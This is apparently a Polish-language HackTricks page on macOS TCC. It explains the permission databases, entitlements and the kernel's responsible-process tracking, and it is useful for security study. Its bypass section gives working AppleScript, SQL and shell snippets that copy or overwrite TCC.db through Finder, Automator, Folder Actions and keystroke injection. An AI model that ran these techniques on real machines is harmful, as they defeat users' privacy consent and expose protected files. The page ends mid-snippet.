# macOS TCC

{{#include ../../../../banners/hacktricks-training.md}}

## **Podstawowe informacje**

**TCC (Transparency, Consent, and Control)** to protokół bezpieczeństwa skupiający się na regulowaniu uprawnień aplikacji. Jego główną rolą jest ochrona wrażliwych funkcji, takich jak **usługi lokalizacyjne, kontakty, zdjęcia, mikrofon, kamera, ułatwienia dostępu oraz pełny dostęp do dysku**. Wymagając wyraźnej zgody użytkownika przed przyznaniem aplikacji dostępu do tych elementów, TCC zwiększa prywatność i kontrolę użytkownika nad jego danymi.

Użytkownicy mają styczność z TCC, gdy aplikacje żądają dostępu do chronionych funkcji. Jest to widoczne w postaci promptu, który pozwala użytkownikom **zezwolić na dostęp lub go odmówić**. Ponadto TCC obsługuje bezpośrednie działania użytkownika, takie jak **przeciąganie i upuszczanie plików do aplikacji**, aby przyznać dostęp do określonych plików i zapewnić aplikacjom dostęp wyłącznie do tego, co zostało wyraźnie dozwolone.

![Przykład promptu TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** jest obsługiwany przez **daemon** znajdujący się w `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` i skonfigurowany w `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (rejestrującym usługę mach `com.apple.tccd.system`).

Działa również **user-mode tccd**, uruchamiany dla każdego zalogowanego użytkownika i zdefiniowany w `/System/Library/LaunchAgents/com.apple.tccd.plist`, który rejestruje usługi mach `com.apple.tccd` oraz `com.apple.usernotifications.delegate.com.apple.tccd`.

Tutaj możesz zobaczyć tccd działający jako system oraz jako użytkownik:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Uprawnienia są **dziedziczone z aplikacji nadrzędnej**, a **uprawnienia** są **śledzone** na podstawie **Bundle ID** i **Developer ID**.

### Bazy danych TCC

Zezwolenia/odmowy są następnie przechowywane w bazach danych TCC:

- Ogólnosystemowa baza danych w **`/Library/Application Support/com.apple.TCC/TCC.db`** .
- Ta baza danych jest **chroniona przez SIP**, więc tylko obejście SIP może zapisywać w niej dane.
- Baza danych TCC użytkownika **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** przechowująca preferencje poszczególnych użytkowników.
- Ta baza danych jest chroniona, więc tylko procesy z wysokimi uprawnieniami TCC, takie jak Full Disk Access, mogą w niej zapisywać dane (ale nie jest chroniona przez SIP).

> [!WARNING]
> Powyższe bazy danych są również **chronione przez TCC przed odczytem**. Oznacza to, że **nie będzie można odczytać** zwykłej bazy danych TCC użytkownika, chyba że odczyt nastąpi z procesu uprzywilejowanego przez TCC.
>
> Należy jednak pamiętać, że proces z takimi wysokimi uprawnieniami (jak **FDA** lub **`kTCCServiceEndpointSecurityClient`**) będzie mógł zapisywać w bazie danych TCC użytkownika.

- Istnieje **trzecia** baza danych TCC w **`/var/db/locationd/clients.plist`**, wskazująca klientów, którzy mogą **uzyskiwać dostęp do usług lokalizacyjnych**.
- Chroniony przez SIP plik **`/Users/carlospolop/Downloads/REG.db`** (również chroniony przed odczytem przez TCC) zawiera **lokalizację** wszystkich **prawidłowych baz danych TCC**.
- Chroniony przez SIP plik **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (również chroniony przed odczytem przez TCC) zawiera więcej przyznanych uprawnień TCC.
- Chroniony przez SIP plik **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (ale możliwy do odczytu przez każdego) zawiera listę dozwolonych aplikacji wymagających wyjątku TCC.

> [!TIP]
> Baza danych TCC w **iOS** znajduje się w **`/private/var/mobile/Library/TCC/TCC.db`**

> [!TIP]
> Interfejs **notification center** może **wprowadzać zmiany w systemowej bazie danych TCC**:
>
> ```bash
> codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/> Support/tccd
> [..]
> com.apple.private.tcc.manager
> com.apple.rootless.storage.TCC
> ```
>
> Użytkownicy mogą jednak **usuwać lub sprawdzać reguły** za pomocą narzędzia wiersza poleceń **`tccutil`**.

#### Sprawdzanie baz danych

{{#tabs}}
{{#tab name="user DB"}}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}

{{#tab name="system DB"}}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Sprawdzając obie bazy danych, możesz sprawdzić, jakie uprawnienia aplikacja ma przyznane, jakich jej odmówiono lub jakich nie ma (aplikacja poprosi o ich przyznanie).

- **`service`** to reprezentacja tekstowa **uprawnienia** TCC
- **`client`** to **bundle ID** lub **ścieżka do pliku binarnego** z uprawnieniami
- **`client_type`** wskazuje, czy jest to Bundle Identifier (0), czy ścieżka absolutna (1)

<details>

<summary>Jak wykonać, jeśli jest to ścieżka absolutna</summary>

Po prostu wykonaj **`launctl load you_bin.plist`**, używając pliku plist takiego jak:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

- **`auth_value`** może przyjmować różne wartości: denied(0), unknown(1), allowed(2) lub limited(3).
- **`auth_reason`** może przyjmować następujące wartości: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12).
- Pole **`csreq`** wskazuje, jak zweryfikować plik binarny, który ma zostać wykonany, i przyznać uprawnienia TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
- Więcej informacji o **pozostałych polach** tabeli znajdziesz w [**tym wpisie na blogu**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).<sup>[[1]](#references)</sup>

Możesz również sprawdzić **już przyznane uprawnienia** aplikacjom w `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.

> [!TIP]
> Użytkownicy _mogą_ **usuwać lub wyszukiwać reguły** za pomocą **`tccutil`**.

#### Resetowanie uprawnień TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
**Baza danych TCC** **przechowuje** **Bundle ID** aplikacji, ale także **przechowuje** **informacje** o **podpisie**, aby **upewnić się**, że aplikacja prosząca o użycie uprawnienia jest właściwą.
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
> [!WARNING]
> Dlatego inne aplikacje używające tej samej nazwy i bundle ID nie będą mogły uzyskać dostępu do uprawnień przyznanych innym aplikacjom.

### Entitlements i uprawnienia TCC

Aplikacje **nie tylko muszą** **zażądać dostępu** do niektórych zasobów i **uzyskać jego przyznanie**, ale muszą również **posiadać odpowiednie entitlements**.\
Na przykład **Telegram** ma entitlement `com.apple.security.device.camera`, aby żądać **dostępu do kamery**. **Aplikacja**, która **nie ma** tego **entitlement**, **nie będzie mogła** uzyskać dostępu do kamery (a użytkownik nawet nie zostanie poproszony o przyznanie uprawnień).

Należy pamiętać, że entitlements to pliki plist, które są częścią code sig, a następnie są dodatkowo haszowane w code sig przez specjalne sloty. Mogą być odpytywane w kernelu przez kod kernela lub przez kod user model przy użyciu `csops(#169)` albo `csops_audittoken(#170)`.

Jednak aby aplikacje mogły **uzyskać dostęp** do **niektórych folderów użytkownika**, takich jak `~/Desktop`, `~/Downloads` i `~/Documents`, **nie muszą** posiadać żadnych konkretnych **entitlements.** System w przejrzysty sposób obsłuży dostęp i **w razie potrzeby poprosi użytkownika o zgodę**.

- [https://newosxbook.com/ent.php](https://newosxbook.com/ent.php)

Aplikacje Apple **nie będą generować promptów**. Zawierają **wstępnie przyznane uprawnienia** na swojej liście **entitlements**, co oznacza, że **nigdy nie wygenerują popupu** ani **nie pojawią się w żadnej z baz danych TCC.** Na przykład:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
This uniemożliwi aplikacji Calendar proszenie użytkownika o dostęp do reminders, calendar i address book.

> [!TIP]
> Oprócz oficjalnej dokumentacji dotyczącej entitlements można również znaleźć nieoficjalne **interesujące informacje o entitlements na** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)

Niektóre uprawnienia TCC to: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Nie istnieje publiczna lista definiująca wszystkie z nich, ale można sprawdzić tę [**listę znanych uprawnień**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).<sup>[[1]](#references)</sup>

### Wrażliwe, niezabezpieczone miejsca

- $HOME (sam w sobie)
- $HOME/.ssh, $HOME/.aws itd.
- /tmp

### User Intent / com.apple.macl

Jak wspomniano wcześniej, możliwe jest **przyznanie aplikacji dostępu do pliku przez przeciągnięcie go i upuszczenie na aplikację**. Dostęp ten nie będzie określony w żadnej bazie danych TCC, lecz jako **rozszerzony** **atrybut pliku**. Atrybut ten będzie **przechowywać UUID** dozwolonej aplikacji:<sup>[[2]](#references)</sup>
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
> [!TIP]
> Ciekawe, że atrybut **`com.apple.macl`** jest zarządzany przez **Sandbox**, a nie przez tccd.
>
> Należy również zauważyć, że jeśli przeniesiesz na inny komputer plik, który zezwala na dostęp UUID aplikacji z Twojego komputera, nie przyzna on dostępu tej aplikacji, ponieważ ta sama aplikacja będzie miała inne UID.

Atrybut rozszerzony `com.apple.macl` **nie może zostać wyczyszczony** tak jak inne atrybuty rozszerzone, ponieważ jest **chroniony przez SIP**. Jednak, jak [**wyjaśniono w tym wpisie**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), można go wyłączyć, **pakując** plik do archiwum ZIP, **usuwając** go, a następnie **rozpakowując** archiwum.<sup>[[3]](#references)</sup>






## Mechanizm Responsible Process w XNU

W macOS/iOS mechanizm **responsible process** jest kluczową funkcją bezpieczeństwa używaną przez framework **TCC (Transparency, Consent, and Control)** oraz inne systemy bezpieczeństwa do śledzenia procesu, który ostatecznie odpowiada za daną akcję, nawet w łańcuchach procesów potomnych.

Gdy TCC sprawdza uprawnienia (np. do kamery, mikrofonu czy lokalizacji), nie zawsze sprawdza bezpośredni proces wykonujący żądanie. Zamiast tego sprawdza **responsible process** — zazwyczaj aplikację GUI, która zainicjowała daną akcję, nawet jeśli faktyczne żądanie pochodzi z procesu pomocniczego lub daemona.

<details>
<summary>Jak ustawiany jest Responsible Process</summary>

### Pola struktury procesu

Każdy proces w XNU przechowuje dwa kluczowe identyfikatory UUID:
```c
// From bsd/sys/proc_internal.h
struct proc {
// ...
pid_t   p_responsible_pid;          // PID of the responsible process
uint8_t p_uuid[16];                 // UUID from LC_UUID load command (self)
uint8_t p_responsible_uuid[16];     // UUID of pid responsible for this process
// ...
};
```
- **`p_uuid`**: Własny UUID procesu (z polecenia ładowania `LC_UUID` w jego pliku binarnym Mach-O)
- **`p_responsible_pid`**: PID procesu odpowiedzialnego
- **`p_responsible_uuid`**: UUID procesu odpowiedzialnego (pozostaje zachowany nawet po zakończeniu tego procesu)

### Jak ustawiany jest proces odpowiedzialny

1. **Podczas tworzenia procesu (Fork)**

Gdy nowy proces jest tworzony za pomocą `fork()` lub `posix_spawn()`, proces odpowiedzialny jest dziedziczony po procesie nadrzędnym (wywołanie systemowe `exec()` ponownie wykorzystuje istniejącą strukturę `proc`, więc ten krok nie jest wtedy powtarzany):

**Lokalizacja**: `bsd/kern/kern_fork.c:1053`
```c
// In fork1_internal() - called during all process creation
proc_set_responsible_pid(child_proc, parent_proc->p_responsible_pid);
```
**Najważniejsze informacje:**
- Procesy potomne **dziedziczą** `p_responsible_pid` procesu nadrzędnego
- Tworzy to **łańcuch odpowiedzialności** w hierarchii procesów
- Proces odpowiedzialny zazwyczaj wskazuje na oryginalną aplikację GUI

2. **Główna funkcja: `proc_set_responsible_pid()`**

**Lokalizacja**: `bsd/kern/kern_proc.c:4817-4831`
```c
void
proc_set_responsible_pid(proc_t target_proc, pid_t responsible_pid)
{
target_proc->p_responsible_pid = responsible_pid;

if (responsible_pid >= 0) {
proc_t responsible_proc = proc_find(responsible_pid);
if (responsible_proc != PROC_NULL) {
// Copy the responsible process's UUID for persistent identification
proc_getexecutableuuid(responsible_proc,
target_proc->p_responsible_uuid,
sizeof(target_proc->p_responsible_uuid));
proc_rele(responsible_proc);
}
}
return;
}
```
**Co robi ta funkcja:**
1. **Ustawia odpowiedzialny PID** w procesie docelowym
2. **Wyszukuje odpowiedzialny proces** za pomocą `proc_find()` (zwiększa licznik referencji)
3. **Kopiuje UUID** z `p_uuid` odpowiedzialnego procesu do `p_responsible_uuid` procesu docelowego
4. **Zwalnia referencję** za pomocą `proc_rele()` (zmniejsza licznik referencji)

3. **Dlaczego przechowywane są zarówno PID, jak i UUID?**

Podejście z podwójnym przechowywaniem rozwiązuje krytyczny problem:

| Pole | Cel | Problem | Rozwiązanie |
|-------|---------|---------|----------|
| `p_responsible_pid` | Szybkie wyszukiwanie bieżącego procesu | PID może zostać ponownie użyty po zakończeniu procesu | Używany do wyszukiwania aktywnego procesu |
| `p_responsible_uuid` | Trwała identyfikacja | Zachowuje ważność po zakończeniu procesu | Używany do kontroli bezpieczeństwa i audytowania |

**Problem**: Jeśli odpowiedzialny proces zakończy działanie przed procesem potomnym, PID może zostać ponownie przydzielony zupełnie innemu procesowi.

**Rozwiązanie**: UUID jest niezmienny i jednoznacznie identyfikuje konkretny plik binarny, który był odpowiedzialny, nawet po jego zakończeniu.

### Przepływ tworzenia procesu
```
┌─────────────────────────────────────────────────────────────┐
│ Parent Process (e.g., Safari)                               │
│ p_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81              │
│ p_responsible_pid: 1234 (points to itself)                 │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
└─────────────────────┬───────────────────────────────────────┘
│
│ fork() / posix_spawn()
▼
┌────────────────────────────┐
│ kern_fork.c:fork1_internal │
│                            │
│ proc_set_responsible_pid(  │
│   child_proc,              │
│   parent->p_responsible_pid│
│ );                         │
└────────────┬───────────────┘
│
▼
┌────────────────────────────┐
│ proc_set_responsible_pid() │
│                            │
│ 1. Set p_responsible_pid   │
│ 2. Find responsible proc   │
│ 3. Copy UUID               │
│ 4. Release reference       │
└────────────┬───────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ Child Process (e.g., SafariHelper)                          │
│ p_uuid: B266C9DD-8E3F-4AAA-9F1E-71D2E3CDEF82              │
│ p_responsible_pid: 1234 (inherited from parent)            │
│ p_responsible_uuid: A155B8BB-7F2C-3EBA-AE7D-60A1F2CDEF81  │
│                     (copied from Safari)                    │
└─────────────────────────────────────────────────────────────┘
```
### Źródło UUID: polecenie ładowania LC_UUID

UUID przechowywany w `p_uuid` pochodzi z **polecenia ładowania `LC_UUID` pliku wykonywalnego Mach-O**:

1. **Czas kompilacji**
```bash
# When linking, the linker (ld) generates a unique UUID
$ ld -o myapp myapp.o
# Embedded in the Mach-O binary as LC_UUID load command
```
2. **Czas wykonania**

**Location**: `bsd/kern/mach_loader.c:2393-2413`
```c
static load_return_t
load_uuid(struct uuid_command *uulp, char *command_end, load_result_t *result)
{
if ((uulp->cmdsize < sizeof(struct uuid_command)) ||
(((char *)uulp + sizeof(struct uuid_command)) > command_end)) {
return LOAD_BADMACHO;
}

// Extract UUID from LC_UUID load command
memcpy(&result->uuid[0], &uulp->uuid[0], sizeof(result->uuid));
return LOAD_SUCCESS;
}
```
3. **Przechowywane w strukturze procesu**

**Lokalizacja**: `bsd/kern/kern_exec.c:2281`
```c
// After loading the Mach-O binary during exec()
proc_setexecutableuuid(p, &load_result.uuid[0]);
```
**Location**: `bsd/kern/kern_proc.c:1912-1915`
```c
void
proc_setexecutableuuid(proc_t p, const unsigned char *uuid)
{
memcpy(p->p_uuid, uuid, sizeof(p->p_uuid));
}
```
</details>


## TCC Privesc & Bypasses

### Wstawianie do TCC

Jeśli w pewnym momencie uda Ci się uzyskać dostęp z prawem zapisu do bazy danych TCC, możesz użyć czegoś takiego, aby dodać wpis (usuń komentarze):

<details>

<summary>Przykład wstawiania do TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Jeśli udało Ci się uzyskać dostęp do aplikacji z niektórymi uprawnieniami TCC, sprawdź następującą stronę z TCC payloads, aby je wykorzystać:


{{#ref}}
macos-tcc-payloads.md
{{#endref}}

### Apple Events

Dowiedz się więcej o Apple Events tutaj:


{{#ref}}
macos-apple-events.md
{{#endref}}

### Automation (Finder) to FDA\*

Nazwa uprawnienia Automation w TCC to: **`kTCCServiceAppleEvents`**\
To konkretne uprawnienie TCC wskazuje również **aplikację, którą można zarządzać** w bazie danych TCC (uprawnienie nie pozwala więc zarządzać wszystkim).

**Finder** to aplikacja, która **zawsze ma FDA** (nawet jeśli nie pojawia się ono w UI), więc jeśli masz nad nią uprawnienia **Automation**, możesz wykorzystać jej uprawnienia, aby **nakłonić ją do wykonania określonych działań**.\
W tym przypadku Twoja aplikacja potrzebowałaby uprawnienia **`kTCCServiceAppleEvents`** dla **`com.apple.Finder`**.<sup>[[4]](#references)</sup>

{{#tabs}}
{{#tab name="Steal users TCC.db"}}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}

{{#tab name="Steal systems TCC.db"}}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{{#endtab}}
{{#endtabs}}

Możesz wykorzystać to do **zapisania własnej bazy danych użytkownika TCC**.

> [!WARNING]
> Dzięki temu uprawnieniu będziesz w stanie **poprosić Findera o dostęp do folderów objętych ograniczeniami TCC** i przekazać Ci znajdujące się w nich pliki, ale z tego, co wiem, **nie będziesz w stanie zmusić Findera do wykonania dowolnego kodu**, aby w pełni wykorzystać jego dostęp FDA.
>
> W związku z tym nie będziesz w stanie wykorzystać pełnych możliwości FDA.

To jest monit TCC umożliwiający uzyskanie uprawnień Automation względem Findera:

<figure><img src="../../../../images/image (27).png" alt="" width="244"><figcaption></figcaption></figure>

> [!CAUTION]
> Pamiętaj, że ponieważ aplikacja **Automator** ma uprawnienie TCC **`kTCCServiceAppleEvents`**, może **sterować dowolną aplikacją**, taką jak Finder. Dlatego posiadając uprawnienie do sterowania Automator możesz również sterować **Finderem** za pomocą kodu takiego jak poniższy:

<details>

<summary>Uzyskaj shell wewnątrz Automatora</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

To samo dzieje się z aplikacją **Script Editor,** która może sterować Finderem, ale za pomocą AppleScript nie można zmusić jej do wykonania skryptu.

### Automatyzacja (SE) do niektórych TCC

**System Events może tworzyć Folder Actions, a Folder Actions mogą uzyskiwać dostęp do niektórych folderów TCC** (Desktop, Documents i Downloads), dlatego skrypt taki jak poniższy może zostać użyty do wykorzystania tego zachowania:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Automatyzacja (SE) + Accessibility (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** do FDA\*

Automatyzacja **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) umożliwia wysyłanie **keystrokes do procesów**. W ten sposób można wykorzystać Finder do zmiany TCC.db użytkownika lub przyznania FDA dowolnej aplikacji (choć może zostać wyświetlona prośba o podanie hasła).

Przykład nadpisywania TCC.db użytkownika przez Finder:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` do FDA\*

Sprawdź tę stronę, aby znaleźć [**payloads do abuse uprawnień Accessibility**](macos-tcc-payloads.md#accessibility) w celu wykonania privesc do FDA\* lub na przykład uruchomienia keyloggera.

### **Endpoint Security Client do FDA**

Jeśli masz **`kTCCServiceEndpointSecurityClient`**, masz FDA. Koniec.

### System Policy SysAdmin File do FDA

**`kTCCServiceSystemPolicySysAdminFiles`** pozwala **zmienić** atrybut **`NFSHomeDirectory`** użytkownika, co zmienia jego folder domowy i tym samym pozwala **ominąć TCC**.<sup>[[5]](#references)</sup>

### User TCC DB do FDA

Uzyskanie **uprawnień zapisu** do bazy danych **user TCC** nie pozwala nadać sobie uprawnień **`FDA`** — może to zrobić wyłącznie baza danych systemu.

Możesz jednak nadać sobie **`Automation rights to Finder`** i abuse poprzedniej techniki, aby eskalować do FDA\*.

### **FDA do uprawnień TCC**

**Full Disk Access** to nazwa TCC **`kTCCServiceSystemPolicyAllFiles`**

Nie sądzę, aby był to prawdziwy privesc, ale na wszelki wypadek, gdyby okazało się to przydatne: jeśli kontrolujesz program z FDA, możesz **zmodyfikować bazę danych TCC użytkownika i nadać sobie dowolny dostęp**. Może to być przydatne jako technika persistence na wypadek utraty uprawnień FDA.

### **SIP Bypass do TCC Bypass**

Systemowa **baza danych TCC** jest chroniona przez **SIP**, dlatego tylko procesy z **określonymi entitlements będą mogły ją modyfikować**. W związku z tym, jeśli attacker znajdzie **SIP bypass** dotyczący **pliku** (będzie w stanie zmodyfikować plik ograniczony przez SIP), będzie mógł:

- **Usunąć ochronę** bazy danych TCC i nadać sobie wszystkie uprawnienia TCC. Może na przykład abuse któregokolwiek z tych plików:
- Baza danych systemu TCC
- REG.db
- MDMOverrides.plist

Istnieje jednak inna opcja abuse tego **SIP bypass w celu ominięcia TCC**: plik `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` zawiera allow listę aplikacji wymagających wyjątku TCC. W związku z tym, jeśli attacker może **usunąć ochronę SIP** z tego pliku i dodać swoją **własną aplikację**, aplikacja będzie mogła ominąć TCC.\
Na przykład, aby dodać terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
